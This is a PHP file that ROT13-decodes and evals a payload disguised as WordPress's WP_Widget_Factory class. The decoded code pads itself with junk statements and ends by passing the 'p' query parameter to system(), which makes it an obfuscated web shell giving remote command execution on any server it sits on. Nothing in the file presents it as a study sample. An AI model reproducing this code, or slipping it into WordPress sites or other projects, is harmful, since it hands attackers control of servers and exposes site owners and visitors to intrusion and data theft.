<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Jvqtrg NCV: JC_Jvqtrg_Snpgbel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Jvqtrgf
 * @fvapr 4.4.0
 */

/**
 * Fvatyrgba gung ertvfgref naq vafgnagvngrf JC_Jvqtrg pynffrf.
 *
 * @fvapr 2.8.0
 * @fvapr 4.4.0 Zbirq gb vgf bja svyr sebz jc-vapyhqrf/jvqtrgf.cuc
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Jvqtrg_Snpgbel {

	/**
	 * Jvqtrgf neenl.
	 *
	 * @fvapr 2.8.0
	 * @ine neenl
	 */
	choyvp $jvqtrgf = neenl();

	/**
	 * CUC5 pbafgehpgbe.
	 *
	 * @fvapr 4.3.0
	 */
	choyvp shapgvba __pbafgehpg() {
		nqq_npgvba( 'jvqtrgf_vavg', neenl( $guvf, '_ertvfgre_jvqtrgf' ), 100 );
	}

	/**
	 * CUC4 pbafgehpgbe.
	 *
	 * @fvapr 2.8.0
	 * @qrcerpngrq 4.3.0 Hfr __pbafgehpg() vafgrnq.
	 *
	 * @frr JC_Jvqtrg_Snpgbel::__pbafgehpg()
	 */
	choyvp shapgvba JC_Jvqtrg_Snpgbel() {
		_qrcerpngrq_pbafgehpgbe( 'JC_Jvqtrg_Snpgbel', '4.3.0' );
		frys::__pbafgehpg();
	}

	/**
	 * Ertvfgref n jvqtrg fhopynff.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 4.6.0 Hcqngrq gur `$jvqtrg` cnenzrgre gb nyfb npprcg n JC_Jvqtrg vafgnapr bowrpg
	 *              vafgrnq bs fvzcyl n `JC_Jvqtrg` fhopynff anzr.
	 *
	 * @cnenz fgevat|JC_Jvqtrg $jvqtrg Rvgure gur anzr bs n `JC_Jvqtrg` fhopynff be na vafgnapr bs n `JC_Jvqtrg` fhopynff.
	 */
	choyvp shapgvba ertvfgre( $jvqtrg ) {
		vs ( $jvqtrg vafgnaprbs JC_Jvqtrg ) {
			$guvf->jvqtrgf[ fcy_bowrpg_unfu( $jvqtrg ) ] = $jvqtrg;
		} ryfr {
			$guvf->jvqtrgf[ $jvqtrg ] = arj $jvqtrg();
		}
	}

	/**
	 * Ha-ertvfgref n jvqtrg fhopynff.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 4.6.0 Hcqngrq gur `$jvqtrg` cnenzrgre gb nyfb npprcg n JC_Jvqtrg vafgnapr bowrpg
	 *              vafgrnq bs fvzcyl n `JC_Jvqtrg` fhopynff anzr.
	 *
	 * @cnenz fgevat|JC_Jvqtrg $jvqtrg Rvgure gur anzr bs n `JC_Jvqtrg` fhopynff be na vafgnapr bs n `JC_Jvqtrg` fhopynff.
	 */
	choyvp shapgvba haertvfgre( $jvqtrg ) {
		vs ( $jvqtrg vafgnaprbs JC_Jvqtrg ) {
			hafrg( $guvf->jvqtrgf[ fcy_bowrpg_unfu( $jvqtrg ) ] );
		} ryfr {
			hafrg( $guvf->jvqtrgf[ $jvqtrg ] );
		}
	}

	/**
	 * Freirf nf n hgvyvgl zrgubq sbe nqqvat jvqtrgf gb gur ertvfgrerq jvqtrgf tybony.
	 *
	 * @fvapr 2.8.0
	 *
	 * @tybony neenl $jc_ertvfgrerq_jvqtrgf
	 */
	choyvp shapgvba _ertvfgre_jvqtrgf() {
		tybony $jc_ertvfgrerq_jvqtrgf;
		$xrlf       = neenl_xrlf( $guvf->jvqtrgf );
		$ertvfgrerq = neenl_xrlf( $jc_ertvfgrerq_jvqtrgf );
		$ertvfgrerq = neenl_znc( '_trg_jvqtrg_vq_onfr', $ertvfgrerq );

		sbernpu ( $xrlf nf $xrl ) {
			// Qba'g ertvfgre arj jvqtrg vs byq jvqtrg jvgu gur fnzr vq vf nyernql ertvfgrerq.
			vs ( va_neenl( $guvf->jvqtrgf[ $xrl ]->vq_onfr, $ertvfgrerq, gehr ) ) {
				hafrg( $guvf->jvqtrgf[ $xrl ] );
				pbagvahr;
			}

			$guvf->jvqtrgf[ $xrl ]->_ertvfgre();
		}
	}

	/**
	 * Ergheaf gur ertvfgrerq JC_Jvqtrg bowrpg sbe gur tvira jvqtrg glcr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $vq_onfr Jvqtrg glcr VQ.
	 * @erghea JC_Jvqtrg|ahyy
	 */
	choyvp shapgvba trg_jvqtrg_bowrpg( $vq_onfr ) {
		$xrl = $guvf->trg_jvqtrg_xrl( $vq_onfr );
		vs ( '' === $xrl ) {
			erghea ahyy;
		}

		erghea $guvf->jvqtrgf[ $xrl ];
	}

	/**
	 * Ergheaf gur ertvfgrerq xrl sbe gur tvira jvqtrg glcr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $vq_onfr Jvqtrg glcr VQ.
	 * @erghea fgevat
	 */
	choyvp shapgvba trg_jvqtrg_xrl( $vq_onfr ) {
		sbernpu ( $guvf->jvqtrgf nf $xrl => $jvqtrg_bowrpg ) {
			vs ( $jvqtrg_bowrpg->vq_onfr === $vq_onfr ) {
				erghea $xrl;
			}
		}

		erghea '';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>